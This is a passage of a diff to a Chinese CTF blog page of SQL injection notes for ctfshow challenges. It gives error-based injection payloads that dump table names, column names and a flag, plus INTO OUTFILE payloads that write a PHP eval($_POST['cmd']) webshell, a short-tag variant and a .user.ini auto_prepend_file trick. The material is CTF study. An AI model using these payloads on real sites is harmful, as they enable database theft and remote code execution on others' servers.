+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>列名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='</span>ctfshow_flags' <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>字段</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag2 <span class="token keyword">from</span> ctfshow_flags<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <hr>
 <h1 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h1><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">参考p神博客</a></p>
 <p>版本限制(5.0.0-5.6.6)</p>
@@ -596,6 +699,43 @@ i<span class="token operator">=</span><span class="token number">0</span>
 <p>这样直接上传是不会解析执行的，所以我们还需要添加脏字符使其执行</p>
 <p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230815124429198.png" alt="image-20230815124429198"></p>
 <p>然后就能成功写入一句话木马</p>
+<hr>
+<h1 id="file注入"><a href="#file注入" class="headerlink" title="file注入"></a>file注入</h1><p>存在<code>into outfile</code>函数上传文件时，如果存在注入点，可以导入一句话或者上传页面</p>
+<blockquote>
+<p>ctfshow web242</p>
+</blockquote>
+<p>原型语句</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from ctfshow_user into outfile '/var/www/html/dump/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filename</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>先看一下<code>into outfile</code>函数有什么参数（图 from Boogipop）</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'/tmp/result.txt'</span>
+<span class="token keyword">FIELDS</span> <span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span> <span class="token string">','</span> <span class="token keyword">OPTIONALLY</span> <span class="token keyword">ENCLOSED</span> <span class="token keyword">BY</span> <span class="token string">'"'</span>
+<span class="token keyword">LINES</span> <span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span> <span class="token string">'\n'</span>
+<span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230819164443843.png" alt="image-20230819164443843"></p>
+<p><code>starting by</code>是每行开始，<code>terminated by</code>是每行结束</p>
+<p><code>LINES TERMINATED BY</code>：结束后添加一个语句，也就是字段间的间隔符</p>
+<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230819171334845.png" alt="image-20230819171334845"></p>
+<p><code>OPTIONALLY ENCLOSED BY</code>：要和<code>LINES TERMINATED BY</code>一起使用，将字段用什么包裹起来</p>
+<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230819171550805.png" alt="image-20230819171550805"></p>
+<p>到这里我们就知道可以插入一句话木马来实现getshell</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">filename<span class="token operator">=</span><span class="token number">1.</span>php<span class="token string">' FIELDS TERMINATED BY '</span><span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>'<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230819172200713.png" alt="image-20230819172200713"></p>
+<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230819172257315.png" alt="image-20230819172257315"></p>
+<h2 id="user-ini和短标签绕过"><a href="#user-ini和短标签绕过" class="headerlink" title=".user.ini和短标签绕过"></a>.user.ini和短标签绕过</h2><blockquote>
+<p>ctfshow web243</p>
+</blockquote>
+<p>过滤php的情况下，就按照文件上传的几个trick来打就行</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">filename<span class="token operator">=</span><span class="token number">1.</span>txt<span class="token string">' FIELDS TERMINATED BY '</span><span class="token operator">&lt;</span>?<span class="token operator">=</span>eval<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>'<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>因为.user.ini是配置文件，所以我们可以构造<code>;</code>和换行符<code>%0a</code>来注释多余字符</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">filename<span class="token operator">=</span><span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">.</span>ini<span class="token string">' lines starting by'</span><span class="token punctuation">;</span><span class="token string">' terminated by '</span><span class="token operator">%</span><span class="token number">0</span>aauto_prepend_file<span class="token operator">=</span><span class="token number">1.</span>txt'<span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
 <hr>
 <h1 id="quine注入"><a href="#quine注入" class="headerlink" title="quine注入"></a>quine注入</h1><p>参考<a target="_blank" rel="noopener" href="https://ph0ebus.cn/post/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BQuine%E6%B3%A8%E5%85%A5.html">ph0ebus大佬的博客</a></p>
 <blockquote>
